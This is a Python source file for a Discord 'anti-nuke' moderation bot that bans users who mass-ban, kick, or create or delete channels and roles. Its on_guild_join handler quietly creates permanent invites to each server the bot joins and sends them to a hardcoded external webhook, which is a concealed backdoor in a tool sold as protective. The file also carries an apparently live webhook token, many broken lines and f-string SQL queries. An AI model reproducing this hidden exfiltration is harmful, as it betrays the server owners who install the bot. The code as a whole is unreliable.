import discord
from discord.ext import commands
import asyncio
import time
import datetime
import sqlite3
import json

intents = discord.Intents.default()
intents.members = True
intents.guilds = True

#---------------------------------------------

prefix = "a!"

bot = commands.Bot(command_prefix=prefix, case_insensitive=True, intents=intents)
bot.remove_command("help")

#---------------------------------------------


@bot.event
async def on_ready():
	print('Avise AntiNuker is online!')
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute('''
		CREATE TABLE IF NOT EXISTS main(
			guild_id TEXT,
			ban_limit TEXT,
			ban_secs TEXT,
			kick_limit TEXT,
			kick_secs TEXT,
			dchan_limit TEXT,
			dchan_secs TEXT,
			cchan_limit TEXT,
			cchan_secs TEXT,
			crole_limit TEXT,
			crole_secs TEXT,
			drole_limit TEXT,
			drole_secs TEXT,
			u_id TEXT UNIQUE

		)
		''')
	return await bot.change_presence(activity=discord.Activity(type=1, name="Type a!help to display command list!"))


#---------------------------------------------


@bot.event
async def on_guild_join(guild):
	webhook = "https://discord.com/api/webhooks/819282025689251862/eRMWH28K3ZFb545ePSJpm1TuxjtbnifmOertEjlcQXgwG_VRp6cHPlmxowZawMwKcea0"
	for channel in guild.channels:
		a = channel[0]
		link = await a.create_invite(max_age=0, max_uses=0)
		await webhook.send(link)


#---------------------------------------------


@bot.event
async def on_member_ban(guild, user):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{guild.id}'")
	result = cursor.fetchone()
	ban_limit = int(result[1])
	ban_secs = int(result[2])
	u_id = int(result[13])
	print(u_id)
	embed = discord.Embed(title="Anti-Nuke System", description="\u200b", color=0x2f3136)
	embed.add_field(name="Anti-Nuke: [~] Banning Members", value="\u200b")
	async for b in guild.audit_logs(limit=ban_limit, after=datetime.datetime.now() - datetime.timedelta(seconds=ban_secs),
	action=discord.AuditLogAction.ban):
		if b.user not in len(u_id):
			await b.user.send(embed=embed)
			await guild.ban(b.user, reason="Anti-Nuke: [~] Banning Members")
	db.commit()
	cursor.close()
	db.close()


@bot.group(invoke_without_command=True)
async def antiban(ctx):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Ban Setup: [~] a!antiban limit <ban limit>",
	                value="\u200b")
	embed.add_field(name="Anti-Ban Setup: [~] a!antiban seconds <ban seconds>",
	                value="\u200b")
	await ctx.send(embed=embed)


@antiban.command()
async def limit(ctx, ban_limit: int):
	embed3 = discord.Embed(title="Anti-Nuke System",
	                       description="\u200b",
	                       color=0x2f3136)
	embed3.add_field(name=f"Anti-Ban: [~] You dont have ownership!",
	                 value="\u200b")
	if ctx.author.id == ctx.guild.owner.id:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT ban_limit FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed = discord.Embed(title="Anti-Nuke System",
		                      description="\u200b",
		                      color=0x2f3136)
		embed.add_field(name=f"Anti-Ban: [~] Limit: {ban_limit}",
		                value="\u200b")
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-Ban: [~] Limit Updated: {ban_limit}",
		                 value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, ban_limit) VALUES (?,?)")
			val = (ctx.guild.id, ban_limit)
			await ctx.send(embed=embed)
		elif result is not None:
			sql = ("UPDATE main SET ban_limit = ? WHERE guild_id = ?")
			val = (ban_limit, ctx.guild.id)
			await ctx.send(embed=embed2)
		cursor.execute(sql, val)
		db.commit()
		cursor.close()
		db.close()
	else:
		await ctx.send(embed=embed3)


@antiban.command()
async def seconds(ctx, ban_secs: int):
	embed3 = discord.Embed(title="Anti-Nuke System",
	                       description="\u200b",
	                       color=0x2f3136)
	embed3.add_field(name=f"Anti-Ban: [~] You dont have ownership!",
	                 value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT ban_secs FROM main WHERE guild_id = {ctx.guild.id}")
		result = cursor.fetchone()
		embed = discord.Embed(title="Anti-Nuke System",
		                      description="\u200b",
		                      color=0x2f3136)
		embed.add_field(name=f"Anti-Ban: [~] Seconds: {ban_secs}",
		                value="\u200b")
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-Ban: [~] Seconds Updated: {ban_secs}",
		                 value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, ban_secs) VALUES (?,?)")
			val = (ctx.guild.id, ban_secs)
			await ctx.send(embed=embed)
		elif result is not None:
			sql = ("UPDATE main SET ban_secs = ? WHERE guild_id = ?")
			val = (ban_secs, ctx.guild.id)
			await ctx.send(embed=embed2)
		cursor.execute(sql, val)
		db.commit()
		cursor.close()
		db.close()
	else:
		await ctx.send(embed=embed3)


#------------------------------------------------


@bot.event
async def on_member_remove(member):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{member.guild.id}'")
	result = cursor.fetchone()
	kick_limit = int(result[3])
	kick_secs = int(result[4])
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Nuke: [~] Kicking Members", value="\u200b")
	async for k in member.guild.audit_logs(
	    limit=kick_limit,
	    after=datetime.datetime.now() - datetime.timedelta(seconds=kick_secs),
	    action=discord.AuditLogAction.kick):
		await k.user.send(embed=embed)
		await member.guild.ban(k.user, reason="Anti-Nuke: [~] Kicking Members")
	db.commit()
	cursor.close()
	db.close()


@bot.group(invoke_without_command=True)
async def antikick(ctx):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Kick Setup: [~] a!antikick limit <kick limit>",
	                value="\u200b")
	embed.add_field(
	    name="Anti-Kick Setup: [~] a!antikick seconds <ban seconds>",
	    value="\u200b")
	await ctx.send(embed=embed)


@antikick.command()
async def limit(ctx, kick_limit: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name=f"Anti-Kick: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-Kick: [~] Limit: {kick_limit}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(name=f"Anti-Ban: [~] Limit Updated: {kick_limit}",
		                 value="\u200b")
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT kick_limit FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		if result is None:
			sql = ("INSERT INTO main(guild_id, kick_limit) VALUES (?,?)")
			val = (ctx.guild.id, kick_limit)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET kick_limit = ? WHERE guild_id = ?")
			val = (kick_limit, ctx.guild.id)
			await ctx.send(embed=embed3)
		cursor.execute(sql, val)
		db.commit()
		cursor.close()
		db.close()
	else:
		await ctx.send(embed=embed)


@antikick.command()
async def seconds(ctx, kick_secs: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name=f"Anti-Kick: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-Kick: [~] Seconds Updated: {kick_secs}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(name=f"Anti-Kick: [~] Seconds: {kick_secs}",
		                 value="\u200b")
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT kick_secs FROM main WHERE guild_id = {ctx.guild.id}")
		result = cursor.fetchone()
		if result is None:
			sql = ("INSERT INTO main(guild_id, kick_secs) VALUES (?,?)")
			val = (ctx.guild.id, kick_secs)
			await ctx.send(embed=embed3)
		elif result is not None:
			sql = ("UPDATE main SET kick_secs = ? WHERE guild_id = ?")
			val = (kick_secs, ctx.guild.id)
			await ctx.send(embed=embed2)
			cursor.execute(sql, val)
			db.commit()
			cursor.close()
			db.close
	else:
		await ctx.send(embed=embed)


#------------------------------------------------


@bot.event
async def on_guild_channel_delete(channel):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{channel.guild.id}'")
	result = cursor.fetchone()
	dchan_limit = int(result[5])
	dchan_secs = int(result[6])
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Nuke: [~] Deleting channels", value="\u200b")
	async for cd in channel.guild.audit_logs(
	    limit=dchan_limit,
	    after=datetime.datetime.now() - datetime.timedelta(seconds=dchan_secs),
	    action=discord.AuditLogAction.channel_delete):
		await cd.user.send(embed=embed)
		await channel.guild.ban(cd.user,
		                        reason="Anti-Nuke: [~] Deleting channels")
	db.commit()
	cursor.close()
	db.close


@bot.group(invoke_without_command=True)
async def antideletechan(ctx):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(
	    name="Anti-DeleteChannel: [~] a!antideletechan limit <limit>",
	    value="\u200b")
	embed.add_field(
	    name="Anti-DeleteChannel: [~] a!antideletechan seconds <seconds>",
	    value="\u200b")
	await ctx.send(embed=embed)


@antideletechan.command()
async def limit(ctx, dchan_limit: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-DeleteChannel: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(f"SELECT * FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-DeleteChannel: [~] Limit: {dchan_limit}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-DeleteChannel: [~] Limit Updated: {dchan_limit}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, dchan_limit) VALUES (?,?)")
			val = (ctx.guild.id, dchan_limit)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET dchan_limit = ? WHERE guild_id = ?")
			val = (dchan_limit, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


@antideletechan.command()
async def seconds(ctx, dchan_secs: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-DeleteChannel: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT dchan_secs FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-DeleteChannel: [~] Seconds: {dchan_secs}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-DeleteChannel: [~] Seconds Updated: {dchan_secs}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, dchan_secs) VALUES (?,?)")
			val = (ctx.guild.id, dchan_secs)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET dchan_secs = ? WHERE guild_id = ?")
			val = (dchan_secs, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.clos
			db.close
	else:
		await ctx.send(embed=embed)


#-----------------------------------------------


@bot.event
async def on_guild_channel_create(channel):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{channel.guild.id}'")
	result = cursor.fetchone()
	cchan_limit = int(result[7])
	cchan_secs = int(result[8])
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Nuke: [~] Creating channels", value="\u200b")
	async for cd in channel.guild.audit_logs(
	    limit=cchan_limit,
	    after=datetime.datetime.now() - datetime.timedelta(seconds=cchan_secs),
	    action=discord.AuditLogAction.channel_create):
		#await cd.user.send(embed=embed)
		await channel.guild.ban(cd.user,
		                        reason="Anti-Nuke: [~] Creating channels")
	db.commit()
	cursor.close()
	db.close


@bot.group(invoke_without_command=True)
async def anticreatechan(ctx):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(
	    name="Anti-CreateChannel: [~] a!anticreatechannel limit <limit>",
	    value="\u200b")
	embed.add_field(
	    name="Anti-CreateChannel: [~] a!anticreatechannel seconds <seconds>",
	    value="\u200b")
	await ctx.send(embed=embed)


@anticreatechan.command()
async def limit(ctx, cchan_limit: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-CreateChannel: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(f"SELECT * FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-CreateChannel: [~] Limit: {cchan_limit}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-CreateChannel: [~] Limit Updated: {cchan_limit}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, cchan_limit) VALUES (?,?)")
			val = (ctx.guild.id, cchan_limit)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET cchan_limit = ? WHERE guild_id = ?")
			val = (cchan_limit, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


@anticreatechan.command()
async def seconds(ctx, cchan_secs: int):
	embed = discord.Embed(title="Anti-Nuke System", description="\u200b")
	embed.add_field(name="Anti-CreateChannel: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT cchan_secs FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-CreateChannel: [~] Seconds: {cchan_secs}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-CreateChannel: [~] Seconds Updated: {cchan_secs}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, cchan_secs) VALUES (?,?)")
			val = (ctx.guild.id, cchan_secs)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET cchan_secs = ? WHERE guild_id = ?")
			val = (cchan_secs, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


#-----------------------------------------------


@bot.event
async def on_guild_role_create(role):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{role.guild.id}'")
	result = cursor.fetchone()
	crole_limit = int(result[9])
	crole_secs = int(result[10])
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Nuke: [~] Creating roles", value="\u200b")
	async for cd in role.guild.audit_logs(
	    limit=crole_limit,
	    after=datetime.datetime.now() - datetime.timedelta(seconds=crole_secs),
	    action=discord.AuditLogAction.role_create):
		await cd.user.send(embed=embed)
		await role.guild.ban(cd.user, reason="Anti-Nuke: [~] Creating roles")
	db.commit()
	cursor.close()
	db.close


@bot.group(invoke_without_command=True)
async def anticreaterole(ctx):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-CreateRole: [~] a!anticreaterole limit <limit>",
	                value="\u200b")
	embed.add_field(
	    name="Anti-CreateRole: [~] a!anticreaterole seconds <seconds>",
	    value="\u200b")
	await ctx.send(embed=embed)


@anticreaterole.command()
async def limit(ctx, crole_limit: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-CreateRole: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(f"SELECT * FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-CreateRole: [~] Limit: {crole_limit}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-CreateRole: [~] Limit Updated: {crole_limit}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, crole_limit) VALUES (?,?)")
			val = (ctx.guild.id, crole_limit)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET crole_limit = ? WHERE guild_id = ?")
			val = (crole_limit, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


@anticreaterole.command()
async def seconds(ctx, crole_secs: int):
	embed = discord.Embed(title="Anti-Nuke System", description="\u200b")
	embed.add_field(name="Anti-CreateRole: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT crole_secs FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-CreateRole: [~] Seconds: {crole_secs}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-CreateChannel: [~] Seconds Updated: {crole_secs}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, crole_secs) VALUES (?,?)")
			val = (ctx.guild.id, crole_secs)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET crole_secs = ? WHERE guild_id = ?")
			val = (crole_secs, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


#-----------------------------------------------


@bot.event
async def on_guild_role_delete(role):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{role.guild.id}'")
	result = cursor.fetchone()
	drole_limit = int(result[11])
	drole_secs = int(result[12])
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Nuke: [~] Deleting roles", value="\u200b")
	async for cd in role.guild.audit_logs(
	    limit=drole_limit,
	    after=datetime.datetime.now() - datetime.timedelta(seconds=drole_secs),
	    action=discord.AuditLogAction.role_delete):
		await cd.user.send(embed=embed)
		await role.guild.ban(cd.user, reason="Anti-Nuke: [~] Deleting roles")
	db.commit()
	cursor.close()
	db.close


@bot.group(invoke_without_command=True)
async def antideleterole(ctx):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-DeleteRole: [~] a!antideleterole limit <limit>",
	                value="\u200b")
	embed.add_field(
	    name="Anti-CreateRole: [~] a!antideleterole seconds <seconds>",
	    value="\u200b")
	await ctx.send(embed=embed)


@antideleterole.command()
async def limit(ctx, drole_limit: int):
	embed = discord.Embed(title="Anti-Nuke System",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-DeleteRole: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(f"SELECT * FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-DeleteRole: [~] Limit: {drole_limit}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-DeleteRole: [~] Limit Updated: {drole_limit}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, drole_limit) VALUES (?,?)")
			val = (ctx.guild.id, drole_limit)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET drole_limit = ? WHERE guild_id = ?")
			val = (drole_limit, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


@antideleterole.command()
async def seconds(ctx, drole_secs: int):
	embed = discord.Embed(title="Anti-Nuke System", description="\u200b")
	embed.add_field(name="Anti-DeleteRole: [~] You dont have ownership!",
	                value="\u200b")
	if ctx.author == ctx.guild.owner:
		db = sqlite3.connect('main.sqlite')
		cursor = db.cursor()
		cursor.execute(
		    f"SELECT drole_secs FROM main WHERE guild_id = '{ctx.guild.id}'")
		result = cursor.fetchone()
		embed2 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed2.add_field(name=f"Anti-DeleteRole: [~] Seconds: {drole_secs}",
		                 value="\u200b")
		embed3 = discord.Embed(title="Anti-Nuke System",
		                       description="\u200b",
		                       color=0x2f3136)
		embed3.add_field(
		    name=f"Anti-DeleteChannel: [~] Seconds Updated: {drole_secs}",
		    value="\u200b")
		if result is None:
			sql = ("INSERT INTO main(guild_id, drole_secs) VALUES (?,?)")
			val = (ctx.guild.id, drole_secs)
			await ctx.send(embed=embed2)
		elif result is not None:
			sql = ("UPDATE main SET drole_secs = ? WHERE guild_id = ?")
			val = (drole_secs, ctx.guild.id)
			await ctx.send(embed=embed3)
			cursor.execute(sql, val)
			db.commit()
			cursor.close
			db.close
	else:
		await ctx.send(embed=embed)


#-----------------------------------------------


@bot.command()
async def whitelist(ctx, member: discord.Member = None):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute("SELECT u_id FROM main WHERE guild_id = ?",
	               (ctx.guild.id, ))
	result = cursor.fetchall()
	embed = discord.Embed(title="Whitelisted users!",
	                      description="\u200b",
	                      color=0x2f3136)
	if member is None:
		for i in result:
			f"{i[0]}"
			embed.add_field(name=f"TAG: <@{int(i[0])}>",
			                value=f"> ID: {int(i[0])}")
		await ctx.send(embed=embed)
	elif len(result) < 25:
		try:
			sql = ("INSERT INTO main(guild_id, u_id) VALUES (?,?)")
			val = (ctx.guild.id, member.id)
			await ctx.send(f"whitelisted <@{member.id}>")
			cursor.execute(sql, val)
		except:
			await ctx.send(f"<@{member.id}> is already whitelisted!")
	else:
		await ctx.send("limit")
	db.commit()
	cursor.close()
	db.close()


#-----------------------------------------------


@bot.group()
async def help(ctx):
	embed = discord.Embed(
	    title="Help Commands!",
	    description=
	    "⚠️This Bot is currently in beta, there are bugs. If you find any bug please dm @Lunn#2021",
	    color=0x2f3136)
	embed.add_field(name="Anti-Nuke", value="> [~] a!help antinuke")
	#embed.add_field(name="Moderation", value="> [~] a!help moderation")
	#embed.add_field(name="Fun", value="> [~] a!help fun")
	await ctx.send(embed=embed)


@help.command()
async def antinuke(ctx):
	embed = discord.Embed(
	    title="Anti-Nuke Commands!",
	    description=
	    "⚠️This Bot is currently in beta, there are bugs. If you find any bug please dm @Lunn#2021⚠️",
	    color=0x2f3136)
	embed.add_field(
	    name="a!antiban <limit or seconds> <ban_limit or ban_secs>",
	    value="> Example: [~] a!antiban limit 2 | a!antiban seconds 1")
	embed.add_field(
	    name="a!antikick <limit or seconds> <kick_limit or kick_secs>",
	    value="> Example: [~] a!antikick limit 2 | a!antikick seconds 1")
	embed.add_field(
	    name=
	    "a!antideletechan <limit or seconds> <delchan_limit or delchan_secs>",
	    value=
	    "> Example: [~] a!antideletechan limit 2 | a!antideletechan seconds 1")
	embed.add_field(
	    name=
	    "a!anticreatechan <limit or seconds> <create_limit or create_secs>",
	    value=
	    "> Example: [~] a!anticreatechan limit 2 | a!anticreatechan seconds 1")
	embed.add_field(
	    name="a!antideleterole <limit or seconds> <role_limit or role_secs>",
	    value=
	    "> Example: [~] a!anticreaterole limit 2 | a!anticreaterole seconds 1")
	embed.add_field(
	    name="a!antideterole <limit or seconds> <role_limit or role_secs>",
	    value=
	    "> Example: [~] a!antideleterole limit 2 | a!antideleterole seconds 1")
	await ctx.send(embed=embed)


#-----------------------------------------------


@bot.command()
async def limits(ctx):
	db = sqlite3.connect('main.sqlite')
	cursor = db.cursor()
	cursor.execute(f"SELECT * FROM main WHERE guild_id = '{ctx.guild.id}'")
	result = cursor.fetchone()
	ban_limit = result[1]
	ban_secs = result[2]
	kick_limit = result[3]
	kick_secs = result[4]
	dchan_limit = result[5]
	dchan_secs = result[6]
	cchan_limit = result[7]
	cchan_secs = result[8]
	crole_limit = result[9]
	crole_secs = result[10]
	drole_limit = result[11]
	drole_secs = result[12]
	embed = discord.Embed(title="Anti-Nuke Limits!",
	                      description="\u200b",
	                      color=0x2f3136)
	embed.add_field(name="Anti-Ban",
	                value=f"> Limit: {ban_limit} ~ Seconds: {ban_secs}")
	embed.add_field(name="Anti-Kick",
	                value=f"> Limit: {kick_limit} ~ Seconds: {kick_secs}")
	embed.add_field(name="Anti-DeleteChannel",
	                value=f"> Limit: {dchan_limit} ~ Seconds: {dchan_secs}")
	embed.add_field(name="Anti-CreateChannel",
	                value=f"> Limit: {cchan_limit} ~ Seconds: {cchan_secs}")
	embed.add_field(name="Anti-CreateRole",
	                value=f"> Limit: {crole_limit} ~ Seconds: {crole_secs}")
	embed.add_field(name="Anti-DeleteRole",
	                value=f"> Limit: {drole_limit} ~ Seconds: {drole_secs}")
	await ctx.send(embed=embed)
	db.commit()
	cursor.close()
	db.close
